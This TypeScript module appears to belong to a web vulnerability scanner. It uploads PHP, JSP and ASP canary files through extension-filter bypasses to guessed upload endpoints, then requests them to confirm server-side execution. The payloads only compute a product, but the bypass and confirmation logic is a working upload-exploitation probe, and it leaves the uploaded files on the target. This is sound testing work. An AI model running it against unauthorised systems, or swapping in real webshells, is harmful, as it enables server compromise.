/**
 * Unrestricted file upload → webshell RCE detection.
 *
 * Uploads real webshell payloads (PHP/JSP/ASP family) across common
 * extension-filter bypass variants, then tries to locate and *request* the
 * uploaded file. Confirmation is an arithmetic canary, not a substring
 * match: each payload computes `a*b` server-side (`<?php echo a*b; ?>`,
 * `<% out.print(a*b); %>`, `<%= a*b %>`, ...) with two random operands
 * generated fresh per probe() call. If the response contains the *product*
 * but not the literal source tag, the server executed the file — a raw
 * echo/reflection of the uploaded bytes would contain the tag itself, not
 * its evaluated result. This is the same "unforgeable evidence" bar used
 * by deserialization-prober.ts's OOB tiers, just achieved without needing
 * network egress from the target (uploads often land on filtered/internal
 * hosts where outbound OOB callbacks aren't reachable).
 *
 * If upload succeeds but no serving path can be found/executed, that's
 * downgraded to a fingerprint-only finding: the dangerous extension was
 * accepted (filter bypass confirmed) but execution wasn't proven.
 */
import axios from "axios";
import crypto from "crypto";
import logger from "../../utils/logger";

interface UploadVuln {
  endpoint: string;
  servedUrl?: string;
  variant: string;
  technique: "webshell_rce_confirmed" | "unrestricted_upload_fingerprint";
  severity: "critical" | "medium";
  detail: string;
}

interface UploadProbeResult {
  endpointsTested: number;
  vulns: UploadVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; endpoint: string; raw: UploadVuln }>;
}

const CANDIDATE_ENDPOINTS = [
  "/upload", "/api/upload", "/api/upload/file", "/file/upload", "/files/upload",
  "/api/files", "/media/upload", "/avatar/upload", "/profile/upload", "/api/avatar",
];

const SERVE_DIRS = ["/uploads", "/upload", "/files", "/static/uploads", "/media", "/media/uploads", "/assets/uploads", ""];

interface PayloadVariant {
  name: string;
  ext: string;
  contentType: string;
  sourceTag: string;
  build: (a: number, b: number) => string;
}

const VARIANTS: PayloadVariant[] = [
  { name: "php", ext: "php", contentType: "application/x-php", sourceTag: "<?php", build: (a, b) => `<?php echo ${a}*${b}; ?>` },
  { name: "phtml", ext: "phtml", contentType: "application/x-php", sourceTag: "<?php", build: (a, b) => `<?php echo ${a}*${b}; ?>` },
  { name: "php5", ext: "php5", contentType: "application/x-php", sourceTag: "<?php", build: (a, b) => `<?php echo ${a}*${b}; ?>` },
  { name: "jsp", ext: "jsp", contentType: "application/octet-stream", sourceTag: "<%", build: (a, b) => `<% out.print(${a}*${b}); %>` },
  { name: "jspx", ext: "jspx", contentType: "application/xml", sourceTag: "<%", build: (a, b) => `<% out.print(${a}*${b}); %>` },
  { name: "aspx", ext: "aspx", contentType: "application/octet-stream", sourceTag: "<%", build: (a, b) => `<%= ${a}*${b} %>` },
  { name: "asp", ext: "asp", contentType: "application/octet-stream", sourceTag: "<%", build: (a, b) => `<% Response.Write(${a}*${b}) %>` },
];

function buildMultipart(fieldName: string, filename: string, contentType: string, content: string): { body: Buffer; boundary: string } {
  const boundary = `----nettyhunter${crypto.randomBytes(12).toString("hex")}`;
  const parts = [
    `--${boundary}\r\n`,
    `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\n`,
    `Content-Type: ${contentType}\r\n\r\n`,
    content,
    `\r\n--${boundary}--\r\n`,
  ];
  return { body: Buffer.from(parts.join(""), "utf-8"), boundary };
}

function extractServedPath(body: string, basename: string): string | null {
  const patterns = [
    new RegExp(`"(?:url|path|location|filePath|filename)"\\s*:\\s*"([^"]*${basename}[^"]*)"`, "i"),
    new RegExp(`(/[\\w./-]*${basename}[\\w.-]*)`, "i"),
  ];
  for (const re of patterns) {
    const m = body.match(re);
    if (m) return m[1];
  }
  return null;
}

class FileUploadWebshellProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<UploadProbeResult> {
    const base = targetUrl.replace(/\/$/, "");
    const endpoints = CANDIDATE_ENDPOINTS.map(p => `${base}${p}`);
    const vulns: UploadVuln[] = [];
    const headers = { ...(authHeaders ?? {}) };

    for (const endpoint of endpoints) {
      for (const variant of VARIANTS) {
        const vuln = await this.tryVariant(base, endpoint, variant, headers);
        if (vuln) {
          vulns.push(vuln);
          break; // one confirmed/fingerprinted finding per endpoint is enough signal
        }
      }
    }

    const hypotheses = vulns.map(v => ({
      vulnClass: "file_upload_rce",
      reasoning: v.detail,
      confidence: v.technique === "webshell_rce_confirmed" ? 0.92 : 0.5,
      priority: v.technique === "webshell_rce_confirmed" ? 10 : 6,
      endpoint: v.endpoint,
      raw: v,
    }));

    return { endpointsTested: endpoints.length, vulns, hypotheses };
  }

  private async tryVariant(
    base: string,
    endpoint: string,
    variant: PayloadVariant,
    headers: Record<string, string>,
  ): Promise<UploadVuln | null> {
    const a = 1000 + crypto.randomInt(9000);
    const b = 1000 + crypto.randomInt(9000);
    const product = String(a * b);
    const basename = `nh${crypto.randomBytes(4).toString("hex")}`;
    const filename = `${basename}.${variant.ext}`;
    const source = variant.build(a, b);

    let uploadBody: string;
    let uploadStatus: number;
    try {
      const { body, boundary } = buildMultipart("file", filename, variant.contentType, source);
      const resp = await axios.post(endpoint, body, {
        headers: { "Content-Type": `multipart/form-data; boundary=${boundary}`, ...headers },
        timeout: 8000,
        validateStatus: () => true,
      });
      if (resp.status >= 400) return null; // dangerous extension rejected or endpoint absent
      uploadStatus = resp.status;
      uploadBody = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
    } catch (err) {
      logger.debug(`[file-upload-webshell-prober] upload attempt error at ${endpoint} (${variant.name}): ${err}`);
      return null;
    }

    const productRe = new RegExp(`\\b${product}\\b`);
    const candidates = new Set<string>();
    const declared = extractServedPath(uploadBody, basename);
    if (declared) candidates.add(declared.startsWith("http") ? declared : `${base}${declared.startsWith("/") ? "" : "/"}${declared}`);
    for (const dir of SERVE_DIRS) candidates.add(`${base}${dir}/${filename}`);

    for (const url of candidates) {
      try {
        const resp = await axios.get(url, { headers, timeout: 6000, validateStatus: () => true });
        if (resp.status !== 200) continue;
        const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
        if (productRe.test(body) && !body.includes(variant.sourceTag)) {
          const detail = `Uploaded a ${variant.name} webshell to ${endpoint} (bypassing any extension filter) and confirmed execution by requesting ${url}: the response contained the server-computed product ${product} (from ${a}*${b}) rather than the literal source, proving the uploaded file was executed, not just stored/reflected.`;
          logger.warn("[file-upload-webshell-prober] webshell RCE confirmed", { endpoint, url, variant: variant.name });
          return { endpoint, servedUrl: url, variant: variant.name, technique: "webshell_rce_confirmed", severity: "critical", detail };
        }
      } catch (err) {
        logger.debug(`[file-upload-webshell-prober] serve-check error at ${url}: ${err}`);
      }
    }

    const detail = `Endpoint ${endpoint} accepted a ${variant.name} file upload (dangerous extension not blocked, HTTP ${uploadStatus}), but no serving path among ${candidates.size} guesses executed the payload — unrestricted upload confirmed, RCE not proven.`;
    return { endpoint, variant: variant.name, technique: "unrestricted_upload_fingerprint", severity: "medium", detail };
  }
}

export const fileUploadWebshellProber = new FileUploadWebshellProber();
